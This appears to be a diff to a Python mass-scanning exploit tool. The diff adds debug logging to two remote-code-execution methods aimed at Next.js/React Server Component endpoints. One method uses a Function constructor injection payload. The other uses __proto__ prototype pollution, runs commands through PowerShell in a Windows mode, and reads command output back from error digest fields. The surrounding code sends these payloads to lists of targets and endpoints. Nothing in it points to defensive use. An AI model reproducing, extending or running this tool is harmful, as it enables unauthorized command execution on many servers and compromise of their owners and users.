@@ -882,6 +882,9 @@ class MassScanner:
     def _exploitMethod1(self, target: str, cmd: str) -> Optional[str]:
         """Primary exploit using Function constructor injection"""
         try:
+            print(f"{Colors.BLUE}[DEBUG] Method 1: Trying Function constructor exploit{Colors.RESET}")
+            print(f"{Colors.BLUE}[DEBUG] Command: {cmd}{Colors.RESET}")
+            
             # Payload to trigger RCE via Function constructor
             payload = {
                 "1": 'I["$1:constructor:constructor"]',
@@ -896,6 +899,7 @@ class MassScanner:
             for endpoint in endpoints:
                 try:
                     exploitUrl = urljoin(target, endpoint)
+                    print(f"{Colors.BLUE}[DEBUG] Trying endpoint: {exploitUrl}{Colors.RESET}")
                     
                     files = {
                         'rsc_payload': (None, json.dumps(payload), 'text/x-component')
@@ -913,23 +917,33 @@ class MassScanner:
                         timeout=10
                     )
                     
+                    print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
+                    
                     if response.status_code == 200 and response.text:
+                        # Return the actual response text
+                        print(f"{Colors.GREEN}[DEBUG] Got response from endpoint!{Colors.RESET}")
                         return response.text[:500]  # Return first 500 chars
                         
-                except Exception:
+                except Exception as e:
+                    print(f"{Colors.YELLOW}[DEBUG] Endpoint error: {e}{Colors.RESET}")
                     continue
             
+            print(f"{Colors.YELLOW}[DEBUG] Method 1 failed, will try Method 2{Colors.RESET}")
             return None
             
-        except Exception:
+        except Exception as e:
+            print(f"{Colors.RED}[DEBUG] Method 1 exception: {e}{Colors.RESET}")
             return None
     
     def _exploitMethod2(self, target: str, cmd: str) -> Optional[str]:
         """Alternative exploit using __proto__ pollution (based on sumanrox PoC)"""
         try:
+            print(f"{Colors.BLUE}[DEBUG] Method 2: Trying __proto__ pollution exploit{Colors.RESET}")
+            
             # Adjust command for Windows if needed
             if self.windowsMode:
                 cmd = f'powershell -c "{cmd}"'
+                print(f"{Colors.BLUE}[DEBUG] Windows mode: {cmd}{Colors.RESET}")
             
             # More reliable payload using prototype pollution
             # This captures command output via Error digest
@@ -975,34 +989,49 @@ class MassScanner:
             # Try the target directly and common endpoints
             testUrls = [target, urljoin(target, '/_next/data'), urljoin(target, '/adfa')]
             
+            # Determine timeout based on WAF bypass mode
+            timeout = 20 if self.wafBypass else 10
+            
             for url in testUrls:
                 try:
+                    print(f"{Colors.BLUE}[DEBUG] Trying endpoint: {url}{Colors.RESET}")
+                    
                     response = self.scanner.session.post(
                         url,
                         files=files,
                         headers=headers,
-                        timeout=self.timeout if not self.wafBypass else 20
+                        timeout=timeout
                     )
+                    
+                    print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
                     
                     # Extract output from digest field in error response
                     if "NEXT_REDIRECT" in response.text or "digest" in response.text:
+                        print(f"{Colors.GREEN}[DEBUG] Found NEXT_REDIRECT or digest in response!{Colors.RESET}")
                         # Parse the digest field which contains command output
                         match = re.search(r'"digest":"([^"]+)"', response.text)
                         if match:
+                            print(f"{Colors.GREEN}[DEBUG] Extracted digest: {match.group(1)[:100]}{Colors.RESET}")
                             return match.group(1)
                         # Sometimes it's in a different format
                         match = re.search(r'digest[^:]*:\s*([^,}\n]+)', response.text)
                         if match:
-                            return match.group(1).strip('"\'')
+                            result = match.group(1).strip('"\'')
+                            print(f"{Colors.GREEN}[DEBUG] Extracted digest (alt format): {result[:100]}{Colors.RESET}")
+                            return result
                         # Return raw if we can't parse but know it worked
+                        print(f"{Colors.YELLOW}[DEBUG] Couldn't parse digest, returning raw response{Colors.RESET}")
                         return response.text[:500]
                         
-                except Exception:
+                except Exception as e:
+                    print(f"{Colors.YELLOW}[DEBUG] Endpoint error: {e}{Colors.RESET}")
                     continue
             
+            print(f"{Colors.YELLOW}[DEBUG] Method 2 failed on all endpoints{Colors.RESET}")
             return None
             
-        except Exception:
+        except Exception as e:
+            print(f"{Colors.RED}[DEBUG] Method 2 exception: {e}{Colors.RESET}")
             return None
 
     def scanTargets(self, targets: List[str], resume: bool = False, liveShell = None) -> List[ScanResult]:
